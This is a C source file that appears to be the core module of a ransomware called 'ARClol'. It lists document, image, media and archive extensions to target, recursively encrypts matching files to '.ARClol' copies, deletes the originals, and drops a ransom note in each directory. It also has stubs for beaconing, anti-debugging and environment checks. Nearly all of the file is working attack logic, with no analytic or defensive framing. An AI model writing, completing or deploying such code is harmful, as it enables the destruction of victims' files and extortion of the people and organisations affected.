#include "ransom_core.h"
#include "file_ops.h"
#include "crypto_engine.h"
#include <stdio.h>
#include <string.h>

// Target file extensions
const wchar_t* TARGET_EXTENSIONS[] = {
    L".doc", L".docx", L".pdf", L".txt", L".jpg", L".png", 
    L".mp3", L".mp4", L".zip", L".xlsx", L".ppt"
};
const uint32_t TARGET_EXTENSION_COUNT = sizeof(TARGET_EXTENSIONS) / sizeof(TARGET_EXTENSIONS[0]);

static ransom_config_t g_current_config;
static aes_context_t g_crypto_context;

int ransom_init(const ransom_config_t* config) {
    memcpy(&g_current_config, config, sizeof(ransom_config_t));
    aes_init(&g_crypto_context, config->master_key, config->master_iv);
    return 0;
}

int ransom_execute(ransom_results_t* results) {
    directory_list_t target_dirs = {0};
    
    // Get target directories
    if (get_target_directories(&target_dirs) != FILE_OP_SUCCESS) {
        return -1;
    }
    
    // Encrypt files in each directory
    for (uint32_t i = 0; i < target_dirs.count; i++) {
        file_info_t* files = NULL;
        uint32_t file_count = 0;
        
        if (enumerate_files_recursive(target_dirs.directories[i], TARGET_EXTENSIONS, 
                                    TARGET_EXTENSION_COUNT, &files, &file_count) == FILE_OP_SUCCESS) {
            
            for (uint32_t j = 0; j < file_count; j++) {
                if (!should_skip_file(&files[j])) {
                    wchar_t output_path[MAX_PATH];
                    wcscpy(output_path, files[j].path);
                    wcscat(output_path, L".ARClol");
                    
                    if (encrypt_file_syscall(files[j].path, output_path, 
                                           g_current_config.master_key, g_current_config.master_iv,
                                           g_current_config.machine_id) == FILE_OP_SUCCESS) {
                        results->files_encrypted++;
                        results->total_bytes_encrypted += files[j].size;
                        
                        // Delete original file
                        file_delete(files[j].path);
                    }
                }
            }
            
            if (file_count > 0) {
                ransom_write_notes(target_dirs.directories[i]);
                results->directories_processed++;
            }
            
            file_free(files);
        }
    }
    
    return 0;
}

int ransom_cleanup(void) {
    return 0;
}

int ransom_send_beacon(const char* event_type) {
    // Simplified beacon implementation
    return 0;
}

int ransom_write_notes(const wchar_t* directory) {
    wchar_t note_path[MAX_PATH];
    wcscpy(note_path, directory);
    wcscat(note_path, L"\\READ_ME_RESTORE_FILES.txt");
    
    HANDLE file_handle;
    if (file_open(note_path, &file_handle, GENERIC_WRITE, CREATE_ALWAYS) == FILE_OP_SUCCESS) {
        const char* note_content = 
            "Your files have been encrypted with ARClol ransomware.\n"
            "Contact support for recovery instructions.\n";
        
        uint32_t bytes_written;
        file_write(file_handle, note_content, strlen(note_content), &bytes_written);
        file_close(file_handle);
    }
    
    return 0;
}

int ransom_show_completion_dialog(const ransom_results_t* results) {
    // Show completion message
    return 0;
}

uint8_t should_skip_file(const file_info_t* file_info) {
    // Skip zero-byte files and already encrypted files
    if (file_info->size == 0) return 1;
    
    wchar_t* ext = wcsrchr(file_info->path, L'.');
    if (ext && wcscmp(ext, L".ARClol") == 0) return 1;
    
    return 0;
}

void anti_debug_checks(void) {
    // Basic anti-debugging
}

void environment_checks(void) {
    // Environment validation
}